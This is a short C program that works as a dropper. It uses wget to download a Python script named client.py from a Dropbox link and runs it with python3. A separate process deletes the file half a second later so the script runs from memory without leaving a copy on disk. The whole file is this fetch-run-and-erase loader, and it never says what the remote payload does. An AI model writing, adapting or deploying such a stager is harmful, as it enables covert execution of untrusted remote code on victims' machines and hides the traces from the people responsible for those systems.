#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/mman.h>

int main(int argc, int *argv[])
{
    int pid;
    // download needed things
    pid = fork();
    if (pid == 0)
    {
        execlp(
            "wget",
            "wget",
            "-c",
            "https://www.dropbox.com/s/yb40a37ufbokksb/client.py?dl=0",
            "-O",
            "client.py",
            NULL);
        perror("Cannot download.");
    }
    else
    {
        waitpid(pid, NULL, 0);
    }
    // RUN CLIENT
    pid = fork();
    if (pid == 0) {
        // wait for python script to load in memory
        usleep(500000);
        execlp(
            "rm",
            "rm",
            "client.py",
            NULL
        );
        perror("Cannot delete client.py");
        exit(1);
    }
    execlp(
        "python3",
        "python3",
        "client.py",
        NULL
    );
    perror("Cannot run client.");
    return 0;
}